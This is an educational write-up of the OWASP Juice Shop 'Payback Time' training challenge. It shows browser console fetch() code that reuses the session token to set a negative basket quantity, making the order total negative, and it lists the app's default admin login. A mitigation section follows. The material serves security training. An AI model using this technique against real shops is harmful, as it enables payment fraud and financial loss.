# Payback Time

> [!WARNING]
> This documentation is purely for educational purposes. Do not use these techniques on real systems without explicit permission.

## Category
Improper Input Validation (OWASP A03:2021) — Difficulty: ⭐⭐⭐

## Description

Place an order that makes you rich by setting a negative quantity for a product in the basket.

## Vulnerability

The `/api/BasketItems/:id` endpoint accepts negative quantities without any server-side validation. By setting a negative quantity, the total price becomes negative, effectively crediting money to the attacker's account instead of charging them.

## Steps

1. Open the Juice Shop in your browser at `http://localhost:3000`
2. Log in with any account (e.g. `admin@juice-sh.op` / `admin123`)
3. Add any product to your basket by clicking on it
4. Open the browser developer tools by pressing `F12`
5. Navigate to the **Console** tab
6. Find your BasketItem ID:

```javascript
fetch('/api/BasketItems/', {
  headers: {'Authorization': 'Bearer ' + localStorage.getItem('token')}
}).then(r=>r.json()).then(d=>console.log(d.data))
```

7. Look for the item with `BasketId: 1` (Admin basket) and note its `id`
8. Set a negative quantity using that ID (replace `ID` with your actual ID):

```javascript
fetch('/api/BasketItems/ID', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({quantity: -100})
}).then(r=>r.json()).then(console.log)
```

9. Navigate to `/#/basket` in the browser
10. Complete the checkout — the total price is now negative

## Proof of Concept

![Challenge solved](./Bildschirmfoto%202026-05-24%20um%2022.31.48.png)

## Impact

An attacker can place orders with negative totals, causing serious financial damage to the shop. In a real e-commerce system this could result in money being transferred to the attacker.

## Mitigation

- Validate that quantity values are always positive integers on the server side
- Never trust client-supplied values without validation
- Implement server-side checks for all numerical inputs
